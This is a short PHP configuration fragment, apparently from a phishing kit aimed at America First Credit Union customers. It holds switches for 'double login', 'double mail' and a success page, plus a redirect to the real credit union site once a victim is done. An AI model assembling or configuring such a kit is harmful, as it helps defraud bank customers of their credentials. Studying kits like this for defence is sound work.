...
// ================================= //
	/*  Pages */
    $dlog= "on"; //on or off double login
    $dmail ="on"; //on or off double mail
    $successpage ="on"; //on or off success page

// ================================= //
    $redirecturl ="https://www.americafirst.com/"; //url to redirect after completion
